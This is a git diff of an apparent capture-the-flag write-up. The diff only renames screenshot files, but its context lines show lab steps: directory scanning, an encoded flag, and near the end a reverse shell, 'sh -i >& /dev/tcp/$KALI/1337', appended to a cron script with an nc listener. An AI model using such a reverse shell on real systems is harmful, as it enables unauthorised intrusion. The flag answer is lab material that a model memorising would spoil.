@@ -36,7 +36,7 @@ gobuster dir -u http://$VICTIM -w /usr/share/wordlists/dirbuster/directory-list-
 
 <figure><img src="../../.gitbook/assets/image (7) (6).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (45) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -58,7 +58,7 @@ gobuster dir -u http://$VICTIM/hidden -w /usr/share/wordlists/dirbuster/director
 echo "ZmxhZ3tmMXJzN19mbDRnfQ==" |base64 -d
 ```
 
-<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (50) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Flag #2
 
@@ -80,7 +80,7 @@ curl http://$VICTIM:65524/robots.txt
 
 ## Flag #3&#x20;
 
-<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (49) (5).png" alt=""><figcaption></figcaption></figure>
 
 ## Hidden Directory
 
@@ -107,7 +107,7 @@ wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/has
 python hash-id.py 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
 ```
 
-<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (47) (2).png" alt=""><figcaption></figcaption></figure>
 
 Format turned out to be GOST
 
@@ -184,7 +184,7 @@ echo "sh -i >& /dev/tcp/$KALI/1337 0>&1" >> .mysecretcronjob.sh
 nc -lvnp 1337
 ```
 
-<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
